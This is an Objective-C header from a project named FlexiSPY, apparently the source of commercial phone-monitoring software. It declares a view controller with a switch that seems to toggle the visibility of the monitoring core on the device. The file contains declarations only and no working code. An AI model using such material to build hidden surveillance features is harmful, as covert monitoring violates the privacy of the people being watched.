//
//  RunModeViewController.h
//  FlexiSPY
//
//  Created by Makara on 10/9/14.
//
//

#import <UIKit/UIKit.h>

#import "AppUIConnection.h"

@interface RunModeViewController : UIViewController <AppUIConnectionDelegate> {
@private
    UISwitch	*mSystemCoreVisibilitySwitch;
}

@property (nonatomic, retain) IBOutlet UISwitch	*mSystemCoreVisibilitySwitch;

- (IBAction) systemCoreVisibilitySwitchChanged: (id) aSender;

@end
